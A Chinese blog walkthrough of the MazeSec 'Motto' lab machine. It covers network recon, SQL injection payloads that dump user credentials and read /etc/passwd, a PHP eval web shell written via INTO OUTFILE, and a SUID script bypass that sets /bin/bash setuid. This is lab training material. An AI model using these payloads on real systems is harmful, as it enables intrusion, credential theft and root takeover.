@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>mazesec-Motto · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-08-03">2025年8月3日</time>
+        
+        
+          <span class="post__readtime">13 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/MazeSec/">#MazeSec</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">mazesec-Motto</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <blockquote>
+<p>我怕长此以往 都这样 滋长的绝望</p>
+<p>在我身上 吧耐心渐渐耗光</p>
+<p>我念念不忘 你离开的晚上</p>
+<p>多悲伤 特别漫长</p>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p><strong>主机发现</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:04       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:c9:f3:a5       (Unknown)</span><br><span class="line">192.168.56.151  08:00:27:38:7e:82       (Unknown)</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.874 seconds (136.61 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<p><strong>端口扫描</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -p- 192.168.56.151</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-02 22:35 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.151</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">9090/tcp open  zeus-admin</span><br><span class="line">MAC Address: 08:00:27:38:7E:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.24 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong>80端口</strong></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031043722.png" alt="image-20250803103813445"></p>
+<p>80端口只是一个前端小游戏，没什么切入点</p>
+<p><strong>3000端口</strong></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031043707.png" alt="image-20250803103858211"></p>
+<p>注册一个账号<code>testtest:testtest</code>登录进去</p>
+<p>写一个Motto然后点击查看我的Motto就会显示出自己写的Motto</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031045964.png" alt="image-20250803104512906"></p>
+<p>如果把昵称改为<code>ta0</code>的话 ，再查看Motto 就会显示ta0的Motto</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031045641.png" alt="image-20250803104557592"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031046120.png" alt="image-20250803104625080"></p>
+<p>改为<code>ta0&#39;</code>则什么都不显示</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031047650.png"></p>
+<p>改为<code>ta0&#39; -- a</code>Motto信息又显示出来了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031047809.png" alt="image-20250803104739752"></p>
+<p>存在注入</p>
+<p><strong>方案1</strong></p>
+<p><code>ta0&#39; union select 1,2, table_name from information_schema.tables where table_schema=database(); -- a</code></p>
+<p>注一下表名</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031051909.png" alt="image-20250803105138858"></p>
+<p><code>ta0&#39; union select 1,2, column_name from information_schema.columns where table_schema=database() and table_name=&#39;register_infos&#39;; -- a</code> 注一下字段名</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031054650.png" alt="image-20250803105443555"></p>
+<p><code>ta0&#39; union select 1,username,password from register_infos; -- a</code>看一下注册信息</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031055455.png" alt="image-20250803105536398"></p>
+<p>这里拿到了<code>RedBean</code>的密码</p>
+<p>不过还可以</p>
+<p><code>ta0&#39; union select 1,2,load_file(&#39;/etc/passwd&#39;); -- a</code></p>
+<p>看一下系统用户</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031057859.png" alt="image-20250803105705796"></p>
+<p>有一个redbean用户</p>
+<p>查出来的密码就是 redbean用户的密码</p>
+<p><strong>方案2</strong></p>
+<p>还可以通过<code>ta1&#39; union select 1,1,&#39;&lt;?php  @eval($_POST[1]);?&gt; into outfile &#39;/var/www/html/config.php&#39;; -- a</code>往80端口的web服务写一个马</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031101599.png" alt="image-20250803110111528"></p>
+<h2 id="二、提权"><a href="#二、提权" class="headerlink" title="二、提权"></a>二、提权</h2><p>ssh可以直接连上redbean用户</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031103172.png" alt="image-20250803110315130"></p>
+<p>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>找到有一个<code>/opt/run_newsh</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031104906.png" alt="image-20250803110429809"></p>
+<p>在redbean的home目录下有一个<code>.backup</code>备份目录</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031106669.png" alt="image-20250803110622591"></p>
+<p>有着<code>new.sh</code>与<code>run_newsh.c</code>的源码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">PATH=/usr/bin</span><br><span class="line"></span><br><span class="line">echo -e &quot;\033[1;35m&quot;</span><br><span class="line">echo &#x27;▓▒░ Loading system diagnostics ░▒▓&#x27;</span><br><span class="line">echo -e &quot;\033[0m&quot;</span><br><span class="line"></span><br><span class="line">echo -e &quot;\033[1;34m[INFO]\033[0m Initializing environment checks:&quot;</span><br><span class="line">for step in A B C; do</span><br><span class="line">    echo -e &quot;\033[1;33m ● Module $&#123;step&#125; status: OK (ver $(($RANDOM%5+1)).$(($RANDOM%20)).$(($RANDOM%500)))\033[0m&quot;</span><br><span class="line">    sleep 0.12</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &quot;Random seed value: $RANDOM&quot;</span><br><span class="line">echo -e &quot;\033[1;34m[INFO]\033[0m Evaluating input parameters...&quot;</span><br><span class="line">sleep 0.15</span><br><span class="line"></span><br><span class="line">[ -n &quot;$1&quot; ] || exit 1</span><br><span class="line">[ &quot;$1&quot; = &quot;flag&quot; ] &amp;&amp; exit 2</span><br><span class="line">[ $1 = &quot;flag&quot; ] &amp;&amp; chmod +s /bin/bash </span><br><span class="line"></span><br><span class="line">echo -e &quot;\033[1;34m[INFO]\033[0m Running diagnostic sequence:&quot;</span><br><span class="line">for step in &#123;1..3&#125;; do</span><br><span class="line">    echo -e &quot;\033[1;35m → Executing test $&#123;step&#125; of 3\033[0m&quot;</span><br><span class="line">    sleep 0.2</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">WAIT_TIME=$((RANDOM%5+2))</span><br><span class="line">echo -e &quot;\033[1;36m\nWaiting period: \033[3$&#123;WAIT_TIME&#125;m$&#123;WAIT_TIME&#125; seconds\033[0m&quot;</span><br><span class="line"></span><br><span class="line">for ((i=WAIT_TIME; i&gt;=0; i--)); do</span><br><span class="line">    case $((i%4)) in</span><br><span class="line">        0) COL=&quot;34&quot; ;; # 蓝</span><br><span class="line">        1) COL=&quot;32&quot; ;; # 绿</span><br><span class="line">        2) COL=&quot;31&quot; ;; # 红</span><br><span class="line">        3) COL=&quot;36&quot; ;; # 青</span><br><span class="line">    esac</span><br><span class="line"></span><br><span class="line">    case $((i%2)) in</span><br><span class="line">        0) echo -e &quot;\033[1;$&#123;COL&#125;m&gt;&gt; Waiting T-$&#123;i&#125; seconds...\033[0m&quot; ;;</span><br><span class="line">        1) echo -e &quot;\033[1;$&#123;COL&#125;m&gt;&gt; Countdown: $&#123;i&#125;\033[0m&quot; ;;</span><br><span class="line">    esac</span><br><span class="line"></span><br><span class="line">    [ $i -gt 0 ] &amp;&amp; sleep 1</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">RESULTS=(</span><br><span class="line">    &quot;Diagnostics complete.&quot;</span><br><span class="line">    &quot;All systems nominal.&quot;</span><br><span class="line">    &quot;No errors detected.&quot;</span><br><span class="line">    &quot;System stable.&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">FINAL_MSG=$&#123;RESULTS[$RANDOM % $&#123;#RESULTS[@]&#125;]&#125;</span><br><span class="line">echo -e &quot;\033[1;32m$&#123;FINAL_MSG&#125;\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[1;34mThank you for using the system monitor.\033[0m&quot;</span><br><span class="line"></span><br><span class="line">echo -e &quot;\033[1;30m[STATS] Summary Report:\033[0m&quot;</span><br><span class="line">echo -e &quot;    Processes checked: $((RANDOM%60+20))&quot;</span><br><span class="line">echo -e &quot;    CPU load average: $(echo &quot;scale=2; $RANDOM%10+0.5&quot; | bc)&quot;</span><br><span class="line">echo -e &quot;    Uptime (hours): $((RANDOM%100+1))&quot;</span><br></pre></td></tr></table></figure>
+
+<p>run_newsh.c</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    if (argc != 2) &#123;</span><br><span class="line">        fprintf(stderr, &quot;Usage: %s &lt;arg&gt;\n&quot;, argv[0]);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 切换为 root 权限（如果以 setuid 运行）</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line"></span><br><span class="line">    // 构造参数，调用 ./new.sh 参数</span><br><span class="line">    char *script = &quot;/opt/new.sh&quot;;</span><br><span class="line">    char *args[] = &#123; script, argv[1], NULL &#125;;</span><br><span class="line"></span><br><span class="line">    execv(script, args);  // 用 execv 调用脚本</span><br><span class="line"></span><br><span class="line">    perror(&quot;execv failed&quot;);</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>new.sh</code>的这三行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ -n &quot;$1&quot; ] || exit 1</span><br><span class="line">[ &quot;$1&quot; = &quot;flag&quot; ] &amp;&amp; exit 2</span><br><span class="line">[ $1 = &quot;flag&quot; ] &amp;&amp; chmod +s /bin/bash </span><br></pre></td></tr></table></figure>
+
+<p>第三个条件没有转换成字符串加个空格就能绕过</p>
+<p>执行<code>redbean@motto:~$ /opt/run_newsh &#39;flag &#39;</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202508031110368.png" alt="image-20250803111014291"></p>
+<p>同时也可以这样</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">redbean@motto:~$ mkdir test </span><br><span class="line">redbean@motto:~$ touch test/flag</span><br><span class="line">redbean@motto:~$ cd test/</span><br><span class="line">redbean@motto:~/test$ /opt/run_newsh &quot;*&quot;</span><br><span class="line"></span><br><span class="line">▓▒░ Loading system diagnostics ░▒▓                                                                                     </span><br><span class="line">                                                                                                                       </span><br><span class="line">[INFO] Initializing environment checks:</span><br><span class="line"> ● Module A status: OK (ver 1.12.97)</span><br><span class="line"> ● Module B status: OK (ver 1.7.137)</span><br><span class="line"> ● Module C status: OK (ver 4.16.344)</span><br><span class="line">Random seed value: 17150</span><br><span class="line">[INFO] Evaluating input parameters...</span><br><span class="line">[INFO] Running diagnostic sequence:</span><br><span class="line"> → Executing test 1 of 3</span><br><span class="line"> → Executing test 2 of 3</span><br><span class="line"> → Executing test 3 of 3</span><br><span class="line"></span><br><span class="line">Waiting period: 2 seconds                                                                                              </span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; Waiting T-2 seconds...</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; Countdown: 1</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; Waiting T-0 seconds...</span></span><br><span class="line">All systems nominal.</span><br><span class="line">Thank you for using the system monitor.</span><br><span class="line">[STATS] Summary Report:</span><br><span class="line">    Processes checked: 68</span><br><span class="line">/opt/new.sh: line 60: bc: command not found</span><br><span class="line">    CPU load average: </span><br><span class="line">    Uptime (hours): 83</span><br><span class="line">redbean@motto:~/test$ ls -al /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash</span><br><span class="line">redbean@motto:~/test$ </span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-07-15">2025·07·15</time>
+          <a class="related__link" href="/2025/07/15/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-5ud0/">mazesec-5ud0</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/08/05/pwn/learn%20Pwn/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">Learn Pwn</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">mazesec-Temp</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
